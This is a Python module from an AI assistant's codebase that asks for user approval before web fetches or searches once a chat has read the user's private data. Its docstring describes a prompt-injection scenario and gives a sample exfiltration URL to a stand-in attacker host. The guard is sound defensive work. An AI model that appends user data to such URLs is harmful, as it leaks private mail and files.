"""Keeping private data from leaving through the strings a model chooses to send out.

`web.fetch`, `browser.open` and `web.search` run without asking, because looking things up is the point. But
their URL or query is written by the model, so a web page, e-mail or file that tricks it could append
something private: `https://attacker.example/?d=<the user's mail>`. The fence around outside text and the
system prompt make that unlikely, not impossible.

So a run becomes *tainted* once a tool that returns the user's private data has run (files, mail, calendar,
memory, skill scripts), or when the chat already holds such a result from an earlier turn. From then on these
tools ask first, unless the destination is one the user named in their own words or already approved in
this run. A search query always asks once tainted, because it goes to the search service whatever it says.
Untainted runs are not affected. What this does not cover is listed in docs/security-backlog.md.
"""

from __future__ import annotations

import re
from typing import TYPE_CHECKING
from urllib.parse import urlsplit

from piyo.models.turn import Message

if TYPE_CHECKING:
    from piyo.tools.base import RunContext

# Tools whose output is the user's own data. A new tool family that reads private data goes here
# (tests/test_exfil.py fails for a registered tool nobody has classified).
PRIVATE_PREFIXES = ("files.", "gmail.", "calendar.", "google.")
PRIVATE_TOOLS = {"memory.recall", "skill.run_script"}

_DOMAIN = re.compile(r"(?<![\w@.-])((?:[a-z0-9-]+\.)+[a-z]{2,})(?![\w-])")


def _normal(name: str) -> str:
    return name.replace("__", ".")


def produces_private_data(tool_name: str) -> bool:
    name = _normal(tool_name)
    return name in PRIVATE_TOOLS or name.startswith(PRIVATE_PREFIXES)


def history_has_private(messages: list[Message]) -> bool:
    """An earlier turn of this chat already read private data (the model still has it in front of it)."""
    failed = {m.tool_call_id for m in messages if m.role == "tool" and m.is_error}
    return any(
        call.id not in failed and produces_private_data(call.name)
        for m in messages
        for call in m.tool_calls or []
    )


def named_domains(text: str) -> set[str]:
    return set(_DOMAIN.findall(text.lower()))


def _named(host: str, ctx: RunContext) -> bool:
    domains = named_domains(ctx.user_text)
    return host in ctx.approved_hosts or any(host == d or host.endswith("." + d) for d in domains)


class OutboundGuard:
    """Decides, from the run's state, whether an outbound call must ask. Never makes anything less strict."""

    def __init__(self, arg: str, kind: str) -> None:
        self.arg, self.kind = arg, kind  # kind: "url" or "query"

    def reason(self, args: dict, ctx: RunContext) -> str | None:
        """Why this call needs the user's approval right now, or None."""
        if not ctx.private_data:
            return None
        if self.kind == "query":
            return "This chat has read your private data, and a search query leaves your computer."
        host = self._host(args)
        if host is None or _named(host, ctx):
            return None
        return (
            f"This chat has read your private data, and you did not name {host}. "
            "Check the address for anything that should not be sent."
        )

    def remember(self, args: dict, ctx: RunContext) -> None:
        """The call was allowed (or needed no approval): its host is not asked about again in this run."""
        if self.kind == "url" and (host := self._host(args)):
            ctx.approved_hosts.add(host)

    def _host(self, args: dict) -> str | None:
        value = args.get(self.arg)
        try:
            return (urlsplit(value.strip()).hostname or None) if isinstance(value, str) else None
        except ValueError:
            return None
